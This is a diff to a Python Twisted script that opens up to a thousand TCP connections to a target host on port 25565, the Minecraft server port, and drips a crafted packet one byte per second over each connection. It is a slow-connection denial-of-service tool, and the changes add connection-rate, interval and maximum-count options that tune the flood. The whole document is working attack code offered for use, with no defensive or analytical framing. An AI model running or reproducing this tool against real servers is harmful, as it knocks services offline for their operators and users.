@@ -3,6 +3,7 @@
 from optparse import OptionParser
 import random
 import string
+from struct import pack
 import sys
 
 usage = """usage: %prog [options] host
@@ -13,9 +14,23 @@ parser = OptionParser(usage)
 parser.add_option("-c", "--count",
     dest="count",
     type="int",
-    default=2000,
+    default=2,
     metavar="COUNT",
-    help="Number of connections to spawn",
+    help="Number of connections per interval",
+)
+parser.add_option("-m", "--max",
+    dest="max",
+    type="int",
+    default=1000,
+    metavar="COUNT",
+    help="Maximum number of connections to spawn",
+)
+parser.add_option("-i", "--interval",
+    dest="interval",
+    type="float",
+    default=0.02,
+    metavar="INTERVAL",
+    help="Time to wait between connections",
 )
 options, arguments = parser.parse_args()
 if len(arguments) != 1:
@@ -23,6 +38,7 @@ if len(arguments) != 1:
 
 # Use poll(). To use another reactor, just change these lines.
 # OSX users probably want to pick another reactor. (Or maybe another OS!)
+# Linux users should definitely do epoll().
 from twisted.internet import pollreactor
 pollreactor.install()
 
@@ -44,8 +60,10 @@ class TrickleProtocol(Protocol):
         Prepare our payload.
         """
 
-        self.payload = "\x02\xff\xff" + "".join(
-            random.choice(string.printable) for i in range(65335))
+        length = random.randint(18, 20)
+        self.payload = "\x02\x00%s%s" % (
+            pack(">b", length),
+            "".join(random.choice(string.printable) for i in range(length)))
         self.index = 0
 
     def connectionMade(self):
@@ -53,6 +71,9 @@ class TrickleProtocol(Protocol):
         Send our payload at an excrutiatingly slow pace.
         """
 
+        # Send the packet type immediately, and then enter into the library
+        # function with the next part of the payload.
+        self.sendchar()
         self.loop = LoopingCall(self.sendchar)
         self.loop.start(1)
 
@@ -81,35 +102,37 @@ class TrickleFactory(Factory):
 
     protocol = TrickleProtocol
 
-    def __init__(self, count):
-        self.max_connections = count
-
+    def __init__(self):
         self.connections = set()
         self.pending = set()
-        self.endpoint = TCP4ClientEndpoint(reactor, arguments[0], 25565)
+        self.endpoint = TCP4ClientEndpoint(reactor, arguments[0], 25565,
+            timeout=2)
 
         LoopingCall(self.log_status).start(1)
+        LoopingCall(self.spawn_connection).start(options.interval)
 
     def spawn_connection(self):
-        d = self.endpoint.connect(self)
-        self.pending.add(d)
+        for i in range(options.count):
+            if len(self.connections) + len(self.pending) >= options.max:
+                return
 
-        def cb(protocol):
-            self.pending.discard(d)
-            self.connections.add(protocol)
-        d.addCallback(cb)
+            d = self.endpoint.connect(self)
+            self.pending.add(d)
+
+            def cb(protocol):
+                self.pending.discard(d)
+                self.connections.add(protocol)
+            def eb(reason):
+                pass
+            d.addCallbacks(cb, eb)
 
     def log_status(self):
         log.msg("%d active connections, %d pending connections" %
             (len(self.connections), len(self.pending)))
 
-        if len(self.connections) + len(self.pending) < self.max_connections:
-            count = self.max_connections - len(self.connections) + len(self.pending)
-            count = min(100, max(0, count))
-            for i in range(count):
-                self.spawn_connection()
-
 log.msg("Trickling against %s" % arguments[0])
-log.msg("Running with up to %d connections" % options.count)
-factory = TrickleFactory(options.count)
+log.msg("Running with up to %d connections" % options.max)
+log.msg("Time interval: %fs, %d conns (%d conns/s)" %
+    (options.interval, options.count, options.count * int(1 / options.interval)))
+factory = TrickleFactory()
 reactor.run()
